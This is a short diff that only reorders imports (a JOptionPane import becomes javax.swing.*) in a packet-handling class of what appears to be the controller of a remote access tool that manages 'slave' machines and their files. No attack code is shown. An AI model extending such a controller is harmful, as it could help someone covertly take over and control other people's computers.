@@ -2,8 +2,9 @@ package jrat.controller.packets.incoming;
 
 import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameRemoteFiles;
+
+import javax.swing.*;
 import java.io.DataInputStream;
-import javax.swing.JOptionPane;
 
 
 public class Packet46FileHash extends AbstractIncomingPacket {
